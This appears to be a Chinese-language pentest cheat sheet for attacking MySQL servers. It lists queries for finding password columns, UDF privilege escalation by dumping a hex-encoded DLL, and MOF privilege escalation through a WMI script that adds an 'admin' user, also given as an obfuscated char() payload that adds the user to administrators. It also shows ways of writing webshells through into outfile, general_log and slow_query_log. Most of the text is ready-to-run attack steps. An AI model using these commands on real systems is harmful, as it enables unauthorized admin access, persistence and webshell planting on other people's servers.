[toc]

# MySql

## 基础语句

### 数据连接情况

```sql
show processlist;
```

### xx 库中所有字段名带 pass|pwd 的表

```sql
select distinct table_name from information_schema.columns where table_schema="xx" and column_name like "%pass%" or column_name like "%pwd%"
```

#### 获取正在执行的sql语句

使用information.schema.processlist 表读取正在执行的sql语句，从而得到表名与列名.


## 提权
### UDF(User Defined Function)提权

**利用条件:**

1. secure-file-priv 不为NULL,查询语句 `show global variables like '%secure%';存在\lib\plugin目录.
2. mysql高权运行.

**步骤:**

1. 查询secure-file-priv是否为null,`show global variables like '%secure%';`

2. 确定mysql版本来确定要使用的udf版本(x64,x86) `show variables like "%version%";`

3. ```mysql
   use mysql;
   set @my_udf_a=concat('',dll的16进制);//将dll以16进制赋值给一个变量
   create table my_udf_data(data LONGBLOB);//创建表
   insert into my_udf_data values("");update my_udf_data set data = @my_udf_a;//将存储dll的的变量插入表中
   show variables like '%plugin%';//查看导出目录
   select data from my_udf_data into DUMPFILE '%plugin%/udftest.dll';//导出dll
   create function sys_eval returns string soname 'udftest.dll';//从dll中创建函数
   select sys_eval('whoami');//
   ```

#### Tips

1. 4.1以前随意注册,无限制.

2. 在4.1到5之后创建函数时,不能包含`\`和`/`.所以需要释放到system32目录中.

3. 5.1之后需要导出到指定的插件目录,即`%plugin%`变量的位置,默认文件夹不存在,需要手动创建(利用NTFS流).

   

### MOF提权

> mof是windows系统的一个文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做"托管对象格式"其作用是每隔五秒就会去监控进程创建和死亡。有了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。

**利用条件:**

1. secure-file-priv 为空.
2. mysql高权运行.

#### 步骤

1. 
   创建mof文件


   ```vb
   pace("\.rootsubscription")
   
   instance of **EventFilter as $EventFilter{    EventNamespace = "RootCimv2";    Name  = "filtP2";    Query = "Select * From **InstanceModificationEvent "
               "Where TargetInstance Isa "Win32_LocalTime" "
               "And TargetInstance.Second = 5";
       QueryLanguage = "WQL";
   };
   
   instance of ActiveScriptEventConsumer as $Consumer
   {
       Name = "consPCSV2";
       ScriptingEngine = "JScript";
       ScriptText =
       "var WSH = new ActiveXObject("WScript.Shell")nWSH.run("net.exe user admin admin /add")";
   };
   
   instance of __FilterToConsumerBinding
   {
       Consumer   = $Consumer;
       Filter = $EventFilter;
   };
   ```

2. 手动上传到目标导入`select load_file('mof file') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof`到Mof目录.
   或者使用select 写入

   ```mysql
   select char(35,112,114,97,103,109,97,32,110,97,109,101,115,112,97,99,101,40,34,92,92,92,92,46,92,92,114,111,111,116,92,92,115,117,98,115,99,114,105,112,116,105,111,110,34,41,13,10,13,10,105,110,115,116,97,110,99,101,32,111,102,32,95,95,69,118,101,110,116,70,105,108,116,101,114,32,97,115,32,36,69,118,101,110,116,70,105,108,116,101,114,13,10,123,13,10,32,32,32,32,69,118,101,110,116,78,97,109,101,115,112,97,99,101,32,61,32,34,82,111,111,116,92,92,67,105,109,118,50,34,59,13,10,32,32,32,32,78,97,109,101,32,32,61,32,34,102,105,108,116,80,50,34,59,13,10,32,32,32,32,81,117,101,114,121,32,61,32,34,83,101,108,101,99,116,32,42,32,70,114,111,109,32,95,95,73,110,115,116,97,110,99,101,77,111,100,105,102,105,99,97,116,105,111,110,69,118,101,110,116,32,34,13,10,32,32,32,32,32,32,32,32,32,32,32,32,34,87,104,101,114,101,32,84,97,114,103,101,116,73,110,115,116,97,110,99,101,32,73,115,97,32,92,34,87,105,110,51,50,95,76,111,99,97,108,84,105,109,101,92,34,32,34,13,10,32,32,32,32,32,32,32,32,32,32,32,32,34,65,110,100,32,84,97,114,103,101,116,73,110,115,116,97,110,99,101,46,83,101,99,111,110,100,32,61,32,53,34,59,13,10,32,32,32,32,81,117,101,114,121,76,97,110,103,117,97,103,101,32,61,32,34,87,81,76,34,59,13,10,125,59,13,10,13,10,105,110,115,116,97,110,99,101,32,111,102,32,65,99,116,105,118,101,83,99,114,105,112,116,69,118,101,110,116,67,111,110,115,117,109,101,114,32,97,115,32,36,67,111,110,115,117,109,101,114,13,10,123,13,10,32,32,32,32,78,97,109,101,32,61,32,34,99,111,110,115,80,67,83,86,50,34,59,13,10,32,32,32,32,83,99,114,105,112,116,105,110,103,69,110,103,105,110,101,32,61,32,34,74,83,99,114,105,112,116,34,59,13,10,32,32,32,32,83,99,114,105,112,116,84,101,120,116,32,61,13,10,32,32,32,32,34,118,97,114,32,87,83,72,32,61,32,110,101,119,32,65,99,116,105,118,101,88,79,98,106,101,99,116,40,92,34,87,83,99,114,105,112,116,46,83,104,101,108,108,92,34,41,92,110,87,83,72,46,114,117,110,40,92,34,110,101,116,46,101,120,101,32,108,111,99,97,108,103,114,111,117,112,32,97,100,109,105,110,105,115,116,114,97,116,111,114,115,32,97,100,109,105,110,32,47,97,100,100,92,34,41,34,59,13,10,32,125,59,13,10,13,10,105,110,115,116,97,110,99,101,32,111,102,32,95,95,70,105,108,116,101,114,84,111,67,111,110,115,117,109,101,114,66,105,110,100,105,110,103,13,10,123,13,10,32,32,32,32,67,111,110,115,117,109,101,114,32,32,32,61,32,36,67,111,110,115,117,109,101,114,59,13,10,32,32,32,32,70,105,108,116,101,114,32,61,32,36,69,118,101,110,116,70,105,108,116,101,114,59,13,10,125,59) into dumpfile 'c:/Windows/system32/wbem/mof/nullevt.mof';
   ```

## Getshell

#### 直接写文件Getwebshell

**利用条件:**

- secure-file-priv参数为空或者为网站根路径
- 知道网站的绝对路径

**步骤:**

```mysql
select 'phpinfo();' into outfile 'c:/www/webshell.php'
```

#### 日志general_log Getshell

**利用条件:**

* 注入点支持堆叠语句或者能独立执行sql语句(phpmyadmin...)
* 知道网站绝对路径

**步骤:**

```mysql
set global general_log='on';//开启日志记录
SET global general_log_file='c:/www/webshell.php';//设置日志路径为web目录
SELECT 'phpinfo();';//该语句会被记录到日志中从而写入webshell
```

#### 慢日志slow_query_logGetshell

MySQL的慢查询日志是MySQL提供的一种日志记录,它用来记录在MySQL中响应时间超过阀值的语句,具体指运行时间超过long_query_time值的SQL,则会被记录到慢查询日志中.long_query_time的默认值为10,意思是运行10S以上的语句.默认情况下,Mysql数据库并不启动慢查询日志,需要我们手动来设置这个参数.

**利用条件:**

* 注入点支持堆叠语句或者能独立执行sql语句(phpmyadmin...)
* 知道网站绝对路径

**步骤:**

```mysql
set global slow_query_log=1;//开启慢查询
set global slow_query_log_file='c:/www/webshell.php';//设置日志路径为web目录
SELECT "phpinfo();"  or sleep(11);//使用sleep(11)使该语句记录到日志
```

## mysql8

### 新增的表
#### information_schema.TABLESPACES_EXTENSIONS
它直接存储了数据库和数据表
### 新增功能
#### table

https://mp.weixin.qq.com/s/R2Sud4uMSTV9egt0Lub36Q

## 参考

https://mp.weixin.qq.com/s/VgXOXVl-Bx2Vi8BYxdx3CA